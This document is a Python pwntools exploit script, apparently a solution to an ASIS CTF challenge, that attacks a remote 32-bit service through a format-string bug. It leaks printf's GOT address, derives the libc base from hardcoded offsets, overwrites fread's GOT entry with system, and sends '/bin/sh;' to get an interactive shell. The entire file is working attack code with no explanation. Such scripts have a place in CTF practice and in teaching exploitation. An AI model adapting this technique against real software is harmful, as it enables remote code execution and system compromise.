from pwn import *
local=len(sys.argv)==1
'''
0804b00c  00000107 R_386_JUMP_SLOT   00000000   printf
0804b010  00000207 R_386_JUMP_SLOT   00000000   memcpy
0804b014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail
0804b018  00000407 R_386_JUMP_SLOT   00000000   fread
0804b01c  00000507 R_386_JUMP_SLOT   00000000   puts
0804b020  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804b024  00000707 R_386_JUMP_SLOT   00000000   exit
0804b028  00000807 R_386_JUMP_SLOT   00000000   strlen
0804b02c  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main
0804b030  00000a07 R_386_JUMP_SLOT   00000000   setvbuf
0804b034  00000b07 R_386_JUMP_SLOT   00000000   memset
0804b038  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf
'''
if not local:
	offset___libc_start_main_ret = 0x18637
	offset_system = 0x0003ad80
	offset_dup2 = 0x000d6410
	offset_read = 0x000d5c00
	offset_write = 0x000d5c70
	offset_str_bin_sh = 0x15ba3f
	offset_printf = 0x49590
else:
	offset_printf = 0x4cc50
	offset_system = 0x3e3e0
'''p printf
$1 = {<text variable, no debug info>} 0x49590 <printf>'''

got_printf=0x804b00c
got_strlen=0x804b028
got_fread=0x804b018
if local:
	s=remote('127.0.0.1',5000)
	raw_input()
else:
	s=remote('diapers.asis-ctf.ir',1343)
for i in xrange(8):
	s.recvline()

print s.recv(1000,timeout=1)

s.sendline('3')

for i in xrange(0x110):
	s.recvline(timeout=1)
	s.recvline(timeout=1)
	s.recvline(timeout=1)
	s.recvline(timeout=1)
	s.recv(2)
	s.sendline('1')
s.recv(1000,timeout=5)
new_len=0x6d-1
offset=16
padding=3
from libformatstr import FormatStr
s.sendline('0')
payload='JUNK'*3+'BBB'+p32(got_printf)+"%18$s"
s.sendline(payload+'A'*((new_len-len(payload))))
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.sendline('2')
s.recvuntil('sponsors:\n')
leak=s.recvline()
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)
s.recvline(timeout=1)

print leak
print "printf leak : ",hex(u32(leak[4:8]))
s.sendline('0')
leak_printf=u32(leak[4:8])
offset_libc=leak_printf-offset_printf
p=FormatStr()
p[got_fread]=offset_libc+offset_system
payload='/bin/sh;'+'A'*7+p.payload(18)
print payload
s.send(payload+'A'*((new_len-len(payload))))
s.sendline('2')
s.interactive()